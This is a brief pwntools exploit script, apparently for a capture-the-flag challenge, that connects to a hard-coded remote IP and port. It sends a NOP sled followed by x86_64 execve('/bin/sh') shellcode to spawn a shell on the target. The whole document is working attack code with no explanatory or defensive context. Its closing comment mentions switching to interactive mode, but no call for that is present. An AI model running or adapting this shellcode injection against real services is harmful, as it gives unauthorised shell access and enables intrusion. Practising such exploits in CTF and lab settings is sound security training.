from pwn import *

# Connect to the challenge server
p = remote("103.69.97.144", 6071)  # Replace with actual IP if needed
context.log_level = "DEBUG"
# x86_64 execve("/bin/sh", NULL, NULL) shellcode
shellcode = (
    b"\x48\x31\xc0\x48\x89\xc7\x50\x54\x5e"
    b"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x50\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05"
)

# Ensure we properly receive the input prompt
p.recv()  # Loosely wait for data

# Add a NOP sled to improve reliability
payload = b"\x90" * 50 + shellcode  

# Send the shellcode payload
p.sendline(payload)
print(p.recvall())
# Drop to interactive mode

